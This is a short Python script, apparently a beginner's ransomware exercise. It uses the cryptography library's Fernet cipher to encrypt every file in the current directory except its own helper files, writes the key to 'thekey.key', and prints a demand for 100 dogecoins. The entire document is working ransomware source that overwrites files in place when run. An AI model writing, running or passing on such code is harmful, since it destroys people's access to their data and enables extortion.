#!/usr/bin.env python3

import os
from cryptography.fernet import Fernet

# Let's find some files

files = []

for file in os.listdir():
	if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":
		continue
	if os.path.isfile(file):
		files.append(file)

print(files)

key = Fernet.generate_key()

with open("thekey.key", "wb") as thekey:
	thekey.write(key)

for file in files:
	with open(file, "rb") as testfile:
		content = testfile.read()
	content_encrypted = Fernet(key).encrypt(content)
	with open(file, "wb") as testfile:
		testfile.write (content_encrypted)


print("All your files have been encrypted. Send me 100 dogecoins.")
